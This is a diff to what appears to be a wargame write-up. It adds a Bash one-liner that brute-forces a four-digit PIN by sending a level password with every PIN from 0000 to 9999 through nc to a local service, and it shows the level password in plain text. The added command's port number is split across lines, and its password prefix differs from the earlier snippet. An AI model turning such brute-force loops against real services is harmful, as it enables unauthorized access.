@@ -42,7 +42,7 @@ But I think it's not necessary to use commond 'nc' so many times
 I try to use redirct so as to 'nc ...' only once
 It cound be faster and faster.
 
-Like this:(but it doesn't work, If only someone could help me, thanks)
+Like this:(~~but it doesn't work, If only someone could help me, thanks~~)
 ```
 #!/bin/bash
 pwd="MYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
@@ -52,3 +52,10 @@ do
         echo $pwd $i
 done
 ```
+
+This works:(by @rvrheenen)
+```
+echo "" > pins && for i in {0000..9999}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> pins; done && cat pins | nc localhost 1
+30002
+```
+This basic idea is creating a dictionary first and then transmit it to the port. A good way!
